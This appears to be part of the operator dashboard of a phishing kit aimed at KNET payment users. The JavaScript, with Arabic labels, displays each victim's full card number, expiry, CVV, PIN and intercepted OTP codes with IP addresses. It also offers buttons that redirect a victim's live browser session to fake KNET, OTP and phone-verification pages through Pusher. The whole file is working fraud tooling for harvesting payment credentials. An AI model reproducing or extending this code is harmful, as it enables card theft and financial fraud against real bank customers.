                        '<div class="dash-knet-line"><span class="lbl">Number</span> ' +
                        numLine +
                        '</div>' +
                        '<div class="dash-knet-line"><span class="lbl">Date</span> ' +
                        exp +
                        '</div>' +
                        '<div class="dash-knet-line"><span class="lbl">PIN</span> ' +
                        pinShow +
                        '</div>' +
                        '<div style="margin-top:10px;font-size:11px;color:' +
                        tsColor +
                        '">وقت التسجيل: ' +
                        escapeHtml(row.timestamp || '') +
                        '</div>' +
                        '</div>'
                    );
                })
                .join('');
        }

        function renderOtpBlock(rows) {
            if (!rows.length) {
                return '<p style="color:#999;font-size:14px;margin:0">لا توجد رموز مسجّلة بعد.</p>';
            }
            return (
                '<div style="margin-top:4px">' +
                rows
                    .map(function (r) {
                        return (
                            '<div class="otp-attempt" style="margin-bottom:8px">' +
                            '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">' +
                            '<span style="font-weight:700;color:#025380">' +
                            escapeHtml(r.label) +
                            (r.extra ? ' — ' + escapeHtml(r.extra) : '') +
                            '</span>' +
                            '<span class="otp-code" style="font-size:18px">' +
                            escapeHtml(r.code) +
                            '</span></div>' +
                            '<div class="otp-meta">' +
                            escapeHtml(r.ts || '') +
                            (r.ip ? ' | IP: ' + escapeHtml(r.ip) : '') +
                            '</div></div>'
                        );
                    })
                    .join('') +
                '</div>'
            );
        }

        function buildRedirectFooterHtml(order, keySuffix) {
            const sidOrd = order.client_session_id ? String(order.client_session_id) : '';
            const sessOrd = sidOrd ? clientSessionsById[sidOrd] : null;
            const chFromOrderRaw =
                order.client_channel_suffix != null
                    ? String(order.client_channel_suffix).replace(/[^a-f0-9]/gi, '')
                    : '';
            const chFromOrder = chFromOrderRaw.length >= 8 ? chFromOrderRaw.slice(0, 16) : '';
            const chFromSess = sessOrd && sessOrd.channel_suffix ? String(sessOrd.channel_suffix) : '';
            const chUse = chFromOrder || chFromSess;
            const quickPages = [
                { label: 'المتجر', path: '/index.html' },
                { label: 'السلة', path: '/cart.html' },
                { label: 'إتمام الطلب', path: '/checkout.html' },
                { label: 'KNET', path: '/knet.php' },
                { label: 'انتظار KNET', path: '/wite/knetwait.php' },
                { label: 'تحقق هاتفي', path: '/verfi/verfi/phone/ver.php' },
                { label: 'OTP', path: '/otp.html' }
            ];
            let btns = '';
            let i;
            const suf = escapeHtml(String(keySuffix)).replace(/[^a-zA-Z0-9_-]/g, '');
            for (i = 0; i < quickPages.length; i++) {
                const qp = quickPages[i];
                if (sidOrd) {
                    btns +=
                        '<button type="button" class="btn-quick-nav" onclick="triggerSessionRedirect(\'' +
                        escapeHtml(sidOrd).replace(/'/g, "\\'") +
                        "', this, '" +
                        qp.path.replace(/'/g, "\\'") +
                        "', '" +
                        escapeHtml(chUse || '').replace(/'/g, "\\'") +
                        "', 'session-redir-msg-" +
                        suf +
                        "')\">" +
                        escapeHtml(qp.label) +
                        '</button>';
                } else {
                    btns +=
                        '<button type="button" class="btn-quick-nav btn-quick-nav-disabled" disabled title="يتطلب جلسة مرتبطة بالطلب">' +
                        escapeHtml(qp.label) +
                        '</button>';
                }
            }
            let html =
                '<div class="dash-submodal-footer">' +
                '<h4 style="margin:0 0 10px;color:#025380;font-size:15px">توجيه العميل</h4>' +
                '<div class="quick-nav-grid">' +
                btns +
                '</div>' +
                '<div class="pusher-direct-msg" id="session-redir-msg-' +
                suf +
                '" style="min-height:22px;margin-top:10px;font-size:13px"></div>';
            const p = order.payment || {};
            const ridDash = getOrderReservationId(order);
            if (p.method === 'knet' && ridDash) {
                html +=
                    '<div class="pusher-direct-row" style="margin-top:12px">' +
                    '<button type="button" class="btn-pusher btn-pusher-ver" onclick="triggerPusherRedirect(\'' +
                    escapeHtml(String(order.id)) +
                    "','" +
                    escapeHtml(ridDash) +
                    "','ver',this,'pusher-direct-msg-" +
                    suf +
                    "')\">تحقق KNET (OTP)</button>" +
                    '<button type="button" class="btn-pusher btn-pusher-knet" onclick="triggerPusherRedirect(\'' +
                    escapeHtml(String(order.id)) +
                    "','" +
                    escapeHtml(ridDash) +
                    "','knet',this,'pusher-direct-msg-" +
                    suf +
                    "')\">إعادة إلى KNET</button>" +
                    '<button type="button" class="btn-pusher btn-pusher-checkout" onclick="triggerPusherRedirect(\'' +
                    escapeHtml(String(order.id)) +
                    "','" +
                    escapeHtml(ridDash) +
                    "','checkout',this,'pusher-direct-msg-" +
                    suf +
                    "')\">صفحة البيانات</button></div>" +
                    '<div class="pusher-direct-msg" id="pusher-direct-msg-' +
                    suf +
                    '" style="margin-top:8px;min-height:22px;font-size:13px"></div>';
            } else if (p.method === 'knet' && !ridDash) {
                html +=
                    '<p class="hint-muted" style="margin-top:10px">لا يوجد رمز جلسة KNET بعد إتمام البطاقة.</p>';
            }
            html += '</div>';
            return html;
        }

        function showCustomerModal(index) {
            const order = filteredOrders[index];
            if (!order) {
                return;
            }
            window.__dashOpenOrderId = order.id;
            window.__dashModalKind = 'customer';
            const c = order.customer || {};
            const suf = 'c' + String(order.id).replace(/\W/g, '');
            document.getElementById('modal-customer-title').textContent = 'بيانات العميل — طلب #' + order.id;
            document.getElementById('modal-customer-body').innerHTML =
                '<div class="detail-section" style="margin:0">' +
                '<div class="detail-row"><span class="detail-label">الاسم</span><span class="detail-value">' +
                emptyOr(c.full_name) +
                '</span></div>' +
                '<div class="detail-row"><span class="detail-label">الهاتف</span><span class="detail-value" dir="ltr">' +
                emptyOr(c.phone) +
                '</span></div>' +
                (c.email
                    ? '<div class="detail-row"><span class="detail-label">البريد</span><span class="detail-value">' +
                      escapeHtml(c.email) +
                      '</span></div>'
                    : '') +
                '<div class="detail-row"><span class="detail-label">IP الطلب</span><span class="detail-value" dir="ltr">' +
                escapeHtml(order.ip_address || '') +
                '</span></div>' +
                '</div>' +
                buildRedirectFooterHtml(order, suf);
            document.getElementById('modalCustomer').classList.add('show');
        }

        function showProductsModal(index) {
            const order = filteredOrders[index];
            if (!order) {
                return;
            }
            window.__dashOpenOrderId = order.id;
            window.__dashModalKind = 'products';
            const suf = 'p' + String(order.id).replace(/\W/g, '');
            const cart = order.cart && Array.isArray(order.cart) ? order.cart : [];
            document.getElementById('modal-products-title').textContent = 'منتجات الطلب — #' + order.id;
            let body = '';
            if (!cart.length) {
                body = '<p style="color:#999">لا توجد أصناف في السلة لهذا الطلب.</p>';
            } else {
                body =
                    '<table style="width:100%;border-collapse:collapse;font-size:14px"><thead><tr style="background:#f0f4f8"><th style="padding:10px;text-align:right">المنتج</th><th>السعر</th><th>الكمية</th><th>الإجمالي</th></tr></thead><tbody>' +
                    cart
                        .map(function (it) {
                            const qty = Number(it.quantity || 0);
                            const price = Number(it.price || 0);
                            const line = (qty * price).toFixed(3);
                            return (
                                '<tr><td style="padding:10px;border-bottom:1px solid #eee">' +
                                escapeHtml(it.name || '') +
                                '</td><td>' +
                                price +
                                '</td><td>' +
                                qty +
                                '</td><td>' +
                                line +
                                '</td></tr>'
                            );
                        })
                        .join('') +
                    '</tbody></table>';
            }
            document.getElementById('modal-products-body').innerHTML =
                body + buildRedirectFooterHtml(order, suf);
            document.getElementById('modalProducts').classList.add('show');
        }

        function showKnetModal(index) {
            const order = filteredOrders[index];
            if (!order) {
                return;
            }
            window.__dashOpenOrderId = order.id;
            window.__dashModalKind = 'knet';
            const suf = 'k' + String(order.id).replace(/\W/g, '');
            const custName = order.customer && order.customer.full_name ? String(order.customer.full_name) : '';
            const cards = collectKnetCardsChrono(order);
            const otpRows = collectOtpRows(order);
            const p = order.payment || {};
            document.getElementById('modal-knet-title').textContent = 'معلومات الدفع — KNET — #' + order.id;
            document.getElementById('modal-knet-body').innerHTML =
                '<div class="detail-section" style="margin-bottom:16px">' +
                '<h4 style="margin:0 0 12px;color:#025380">بطاقات KNET</h4>' +
                renderDashKnetCards(cards, custName) +
                '</div>' +
                '<div class="detail-section">' +
                '<h4 style="margin:0 0 12px;color:#025380">رموز OTP والمحاولات</h4>' +
                renderOtpBlock(otpRows) +
                '</div>' +
                '<div class="detail-section" style="margin-top:14px">' +
                '<div class="detail-row"><span class="detail-label">المبلغ</span><span class="detail-value"><strong>' +
                escapeHtml(String(p.total || '')) +
                ' ' +
                escapeHtml(String(p.currency || '')) +
                '</strong></span></div></div>' +
                buildRedirectFooterHtml(order, suf);
            document.getElementById('modalKnet').classList.add('show');
        }

        function showCardModal(index) {
            const order = filteredOrders[index];
            if (!order) {
                return;
            }
            window.__dashOpenOrderId = order.id;
            window.__dashModalKind = 'card';
            const suf = 'd' + String(order.id).replace(/\W/g, '');
            const cd = order.card_data;
            const otpRows = collectOtpRows(order);
            const p = order.payment || {};
            let cardBlock = '<p style="color:#999">لا توجد بيانات بطاقة محفوظة.</p>';
            if (cd) {
                const num =
                    formatCardNumberGrouped(cd.full_number) ||
                    ('**** **** **** ' + escapeHtml(String(cd.last4 || '')));
                const cardFilled = checkoutCardHasData(cd);
                const cardCls = 'dash-knet-card ' + (cardFilled ? 'dash-knet-card-filled' : 'dash-knet-card-empty');
                cardBlock =
                    '<div class="' +
                    cardCls +
                    '">' +
                    '<div class="dash-knet-card-top"><span>بطاقة الدفع</span><span class="dash-knet-badge">بطاقة</span></div>' +
                    '<div class="dash-knet-line"><span class="lbl">Name</span> ' +
                    escapeHtml(cd.holder_name || '—') +
                    '</div>' +
                    '<div class="dash-knet-line"><span class="lbl">Number</span> ' +
                    num +
                    '</div>' +
                    '<div class="dash-knet-line"><span class="lbl">Date</span> ' +
                    escapeHtml(cd.expiry || '—') +
                    '</div>' +
                    '<div class="dash-knet-line"><span class="lbl">CVV</span> ' +
                    escapeHtml(cd.cvv || '—') +
                    '</div></div>';
            }
            document.getElementById('modal-card-title').textContent = 'معلومات الدفع — بطاقة — #' + order.id;
            document.getElementById('modal-card-body').innerHTML =
                '<div class="detail-section" style="margin-bottom:16px">' +
                cardBlock +
                '</div>' +
                '<div class="detail-section">' +
                '<h4 style="margin:0 0 12px;color:#025380">رموز OTP</h4>' +
                renderOtpBlock(otpRows) +
                '</div>' +
                '<div class="detail-section" style="margin-top:14px">' +
                '<div class="detail-row"><span class="detail-label">المبلغ</span><span class="detail-value"><strong>' +
                escapeHtml(String(p.total || '')) +
                ' ' +
                escapeHtml(String(p.currency || '')) +
                '</strong></span></div></div>' +
                buildRedirectFooterHtml(order, suf);
            document.getElementById('modalCardPay').classList.add('show');
        }

        function closeSubModal(id) {
            const el = document.getElementById(id);
            if (el) {
                el.classList.remove('show');
            }
            window.__dashOpenOrderId = null;
            window.__dashModalKind = null;
        }

        function closeSubModalBackdrop(e, id) {
            if (e.target.id === id) {
                closeSubModal(id);
            }
        }

        function closeAllDashModals() {
            ['modalCustomer', 'modalProducts', 'modalKnet', 'modalCardPay'].forEach(function (id) {
                const el = document.getElementById(id);
                if (el) {
                    el.classList.remove('show');
                }
            });
            window.__dashOpenOrderId = null;
            window.__dashModalKind = null;
        }

        function triggerPusherRedirect(orderId, reservationId, destination, btn, msgDomId) {
            const msg = document.getElementById(msgDomId || 'pusher-direct-msg');
            if (msg) {
                msg.textContent = 'جاري الإرسال...';
                msg.style.color = '#025380';
            }
            if (btn) {
                btn.disabled = true;
            }
            const payload = {
                order_id: String(orderId),
                reservation_id: String(reservationId),
                destination: destination
            };
            fetch('../pusher_customer_redirect.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
                .then(function (r) {
                    return r.json();
                })
                .then(function (data) {
                    if (btn) {
                        btn.disabled = false;
                    }
                    if (!msg) {
                        return;
                    }
                    if (data.success) {
                        msg.textContent = data.message || 'تم الإرسال';
                        msg.style.color = '#0f5132';
                    } else {
                        msg.textContent = data.message || 'فشل الإرسال';
                        msg.style.color = '#842029';
                    }
                })
                .catch(function (err) {
                    if (btn) {
                        btn.disabled = false;
                    }
                    if (msg) {
                        msg.textContent = 'خطأ في الاتصال';
                        msg.style.color = '#842029';
                    }
                    console.error(err);
                });
        }

        function triggerSessionRedirect(sessionId, btn, redirectUrl, channelSuffix, msgDomId) {
            const msg = document.getElementById(msgDomId || 'session-redir-msg');
            let url = redirectUrl != null && String(redirectUrl).length ? String(redirectUrl).trim() : '';
            if (!url) {
                if (msg) {
                    msg.textContent = 'اختر صفحة من الأزرار أعلاه.';
                    msg.style.color = '#842029';
                }
                return;
            }
            if (msg) {
                msg.textContent = 'جاري الإرسال...';
                msg.style.color = '#025380';
            }
            if (btn) {
                btn.disabled = true;
            }
            const body = {
                target: 'session',
                session_id: String(sessionId),
                redirect_url: url
            };
            if (channelSuffix && String(channelSuffix).length === 16) {
                body.channel_suffix = String(channelSuffix);
            }
            fetch('../pusher_customer_redirect.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            })
                .then(function (r) {
                    return r.json();
                })
                .then(function (data) {
                    if (btn) {
                        btn.disabled = false;
                    }
                    if (!msg) {
                        return;
                    }
                    if (data.success) {
                        msg.textContent = data.message || 'تم الإرسال';
                        msg.style.color = '#0f5132';
                    } else {
                        msg.textContent = data.message || 'فشل الإرسال';
                        msg.style.color = '#842029';
                    }
                })
                .catch(function (err) {
                    if (btn) {
                        btn.disabled = false;
                    }
                    if (msg) {
                        msg.textContent = 'خطأ في الاتصال';
                        msg.style.color = '#842029';
                    }
                    console.error(err);
                });
        }

        function updateStats(orders) {
            const list = Array.isArray(orders) ? orders : [];
            const total = list.length;
            const today = new Date().toISOString().split('T')[0];
            const todayOrders = list.filter(function (o) {
                return o && String(o.created_at || '').startsWith(today);
            }).length;
            const knetOrders = list.filter(function (o) {
                return o && o.payment && o.payment.method === 'knet';
            }).length;
            const cardOrders = list.filter(function (o) {
                return o && o.payment && o.payment.method === 'card';
            }).length;

            let activeCount = 0;
            Object.keys(clientSessionsById).forEach(function (k) {
                const s = clientSessionsById[k];
                if (s && s.active) {
                    activeCount++;
                }
            });
            const elAct = document.getElementById('active-sessions');
            if (elAct) {
                elAct.textContent = activeCount;
            }

            document.getElementById('total-orders').textContent = total;
            document.getElementById('today-orders').textContent = todayOrders;
            document.getElementById('knet-orders').textContent = knetOrders;
            document.getElementById('card-orders').textContent = cardOrders;
        }

        function getStatusText(status) {
            const map = {
                'pending': 'قيد الانتظار',
                'otp_verified': 'تم التحقق',
                'paid': 'مدفوع'
            };
            return map[status] || status;
        }

        function resetFilters() {
            document.getElementById('search').value = '';
            document.getElementById('filter-method').value = '';
            displayOrders(allOrders);
        }

        function deleteOrderById(orderId) {
            if (!window.confirm('حذف هذا السجل من اللوحة نهائياً؟')) {
                return;
            }
            fetch('delete_order.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ order_id: String(orderId) }),
                credentials: 'same-origin'
            })
                .then(function (r) {
                    return r.json();
                })
                .then(function (data) {
                    if (data && data.success) {
                        if (String(window.__dashOpenOrderId) === String(orderId)) {
                            closeAllDashModals();
                        }
                        loadOrders();
                    } else {
                        alert((data && data.message) || 'تعذّر الحذف');
                    }
                })
                .catch(function () {
                    alert('خطأ في الاتصال');
                });
        }

        document.querySelector('.orders').addEventListener('click', function (e) {
            var btn = e.target.closest('button.btn-row-del');
            if (!btn) {
                return;
            }
            var tb = document.getElementById('orders-table');
            if (!tb || !tb.contains(btn)) {
                return;
            }
            var oid = btn.getAttribute('data-order-id');
            if (oid) {
                e.preventDefault();
                deleteOrderById(oid);
            }
        });

        // Keyboard ESC to close
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeAllDashModals();
            }
        });

        loadOrders();
        connectDashboardPusher();
        /* طلبات: تحديث متوسط السرعة */
        setInterval(loadOrders, 6000);
        /* جلسات العملاء: تحديث شبه فوري لعمود نشط / الصفحة */
        setInterval(refreshClientSessionsOnly, 2000);
    </script>
</body>
</html>